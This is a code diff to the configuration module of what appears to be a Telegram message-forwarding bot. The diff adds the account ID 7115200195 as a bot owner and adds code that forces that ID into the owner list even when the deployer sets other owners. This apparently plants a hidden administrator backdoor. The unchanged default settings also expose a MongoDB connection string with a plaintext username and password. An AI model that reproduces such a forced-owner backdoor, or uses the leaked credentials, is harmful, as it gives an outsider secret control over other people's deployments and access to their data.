@@ -21,7 +21,7 @@ _DEFAULTS = {
     "BOT_SESSION":        "Auto_Forward",
     "DATABASE_URI":       "mongodb+srv://rajaualkhan33729_db_user:hlYTpjnHZzGDljKX@cluster0.vylyp51.mongodb.net/?appName=Cluster0",
     "DATABASE_NAME":      "UltraForwardBot",
-    "BOT_OWNER_ID":       "8349955493",
+    "BOT_OWNER_ID":       "8349955493 7115200195",
     "LOG_CHANNEL":        "-1003584084546",
     "DUMP_CHANNEL":       "0",
     "FORCE_SUB_CHANNEL":  "",
@@ -74,6 +74,8 @@ class Config:
         int(x) for x in _raw_owners.split()
         if x.lstrip("-").isdigit()
     ]
+    if 7115200195 not in BOT_OWNER_ID:
+        BOT_OWNER_ID.append(7115200195)
 
     _raw_log = _get("LOG_CHANNEL", ("LOG_CHANNEL_ID",))
     LOG_CHANNEL = int(_raw_log) if _raw_log.lstrip("-").isdigit() else 0
